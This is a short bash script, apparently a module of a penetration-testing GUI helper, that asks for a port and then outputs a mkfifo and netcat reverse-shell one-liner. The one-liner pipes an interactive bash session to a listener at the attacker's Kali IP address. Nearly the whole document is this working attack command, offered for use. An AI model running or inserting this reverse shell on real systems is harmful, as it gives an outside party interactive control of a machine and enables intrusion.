#!/bin/bash

: '
generate mkfifo reverse
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${PORT_FIELD}"

PORT=${form_data["port"]}

execute_command "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_IP} ${PORT} > /tmp/f"
create_new_line
